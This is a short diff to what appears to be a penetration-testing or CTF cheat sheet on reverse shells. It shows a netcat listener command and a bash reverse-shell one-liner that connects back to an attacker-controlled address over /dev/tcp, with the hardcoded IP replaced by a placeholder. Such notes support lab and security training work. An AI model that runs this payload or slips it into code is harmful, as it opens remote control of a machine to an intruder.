@@ -16,7 +16,7 @@ rlwrap -crA nc -lvnp 9001
 
 ```bash
 # Basic bash reverse shell
-bash -i >& /dev/tcp/192.168.1.10/9001 0>&1
+bash -i >& /dev/tcp/$IP/9001 0>&1
 ```
 
 **Note:** Try different payloads from [RevShells](https://www.revshells.com) if a simple bash one doesn't work
